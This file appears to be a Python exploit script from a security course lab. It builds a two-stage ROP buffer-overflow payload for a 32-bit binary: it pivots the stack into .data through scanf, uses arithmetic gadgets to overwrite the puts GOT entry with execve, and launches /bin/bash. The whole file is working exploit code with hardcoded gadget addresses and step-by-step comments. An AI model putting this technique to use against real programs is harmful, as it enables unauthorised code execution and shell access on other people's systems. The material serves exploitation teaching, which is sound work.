#!/usr/bin/env python

import argparse
import struct

parser = argparse.ArgumentParser(description="Create buffer overflow")
parser.add_argument("offset", help="hex offset value")
args = parser.parse_args()

# ******************************************************************************
# ******************************************************************************
# Piece together the exploit string as a python list.
#   The offset value input is embedded below in the list.
# ******************************************************************************
# ******************************************************************************


def p(addr):
    return struct.pack('<l', addr)

offset = int(args.offset, 16)

# Choose the stage1addr >= .data section address 0x0804a018
stage1addr = 0x0804aa24
# puts@plt 0x080483cc ==> GOT entry 0x0804a014
puts_PLT = 0x080483cc
puts_GOT = 0x0804a014

exploit = []

# ******************************************************************************
# First question answer
# ******************************************************************************

exploit.append("57\n" )

# ******************************************************************************
# Stage 0 buffer
# ******************************************************************************

# Fill up callee stack
exploit.append("X"*267)

# Call scanf to copy stage 1 into .data
#   scanf address = 0x080483bc
exploit.append(p(0x080483bc))
#   Get rid of 2 scanf arguments, gadget 0x8048462L: pop ebx ; pop ebp ;;
exploit.append(p(0x8048462))
#   1st arg = 0x08048707, pointer to %s
exploit.append(p(0x08048707))
#   2nd arg = stage1addr, pointer into .data
exploit.append(p(stage1addr))

# After scanf, use leave to switch to stage 1 just read in
#   pop .data address into ebp so leave will set esp to stage 1 in .data
#   use gadget 0x8048463L: pop ebp ;; to pop .data
exploit.append(p(0x8048463))
exploit.append(p(stage1addr))
#   use gadget 0x804836aL: leave ;; to branch to stage 1
#     key to this is that .data is at a fixed address
exploit.append(p(0x804836a))
exploit.append("\n")



# ******************************************************************************
# Stage 1 buffer at stage1addr
# ******************************************************************************

# Stage 0 leaves to get here, so this is pop'ed into ebp
# Later on this is used as the target of an add instruction
exploit.append(p(0x01010101))

# First change puts GOT to execve GOT
#   tricks needed to get around needing gadget with leave (which updates esp)
#   use gadget 0x8048463L:
#     pop ebp ;; to set up ebp to value after leave instruction
exploit.append(p(0x8048463))
# This points to "after-leave" ahead
exploit.append(p(stage1addr+4*6))
#   use gadget 0x8048368L:
#     pop eax ; pop ebx ; leave ;; to setup eax and ebx for add
exploit.append(p(0x8048368))
#   libc offsets goes here with subtractions to avoid whitespace in value
#   NOTE: subtracting 3 times avoids whitespace for the values we've seen.
#     For extra credit, compute the number of subtractions required and
#     modify the following code to handle a variable number of subtractions
#     and the resulting moving of address offsets below.
exploit.append(p(offset - 0x0804a024 - 0x0804a024 - 0x0804a024))
#   set ebx to start of .data minus a constant: stage1addr - 0x5d5b04c4
exploit.append(p(stage1addr-0x5d5b04c4))
# target after-leave = stage1addr + 4*6
exploit.append("junk")
#   now correct eax by 3 times doing gadget 0x8048459L:
#     add eax 0x804a024 ; add [ebx+0x5d5b04c4] eax ;;
#   NOTE: number of adds should match number of subtractions above.
exploit.append(p(0x8048459))
exploit.append(p(0x8048459))
exploit.append(p(0x8048459))
#   now set up ebx using gadget 0x8048462L:
#     pop ebx ; pop ebp ;;
exploit.append(p(0x8048462))
#   set ebx to GOT entry address - 0x5d5b04c4
exploit.append(p(puts_GOT - 0x5d5b04c4))
#   junk for ebp
exploit.append("junk")
#   gadget to store GOT update 0x804845eL:
#     add [ebx+0x5d5b04c4] eax ;;
exploit.append(p(0x804845e))

# Call execve as puts after GOT rewrite
exploit.append(p(puts_PLT))
#   the function isn't returning
exploit.append("junk")
# 1st argument is pointer to target bash = "/bin/bash"
# NOTE: if computed number of adds above, this address must be adjusted.
exploit.append(p(stage1addr+4*19))
# 2nd argument is argument array (pointer to NULL 0x8048748)
exploit.append(p( 0x8048748))
# 3rd argument is environment array (pointer to NULL ...)
exploit.append(p(0x8048748))
# Here goes "/bin/bash"
# Target bash =  = stage1addr + (4*19)
# NOTE: if computed number of adds above, refs to this address must be adjusted.
exploit.append("/bin/bash")

# ******************************************************************************
# ******************************************************************************
# Print out the exploit string
# ******************************************************************************
# ******************************************************************************
outstring = "".join(exploit)
print(outstring)
exit()
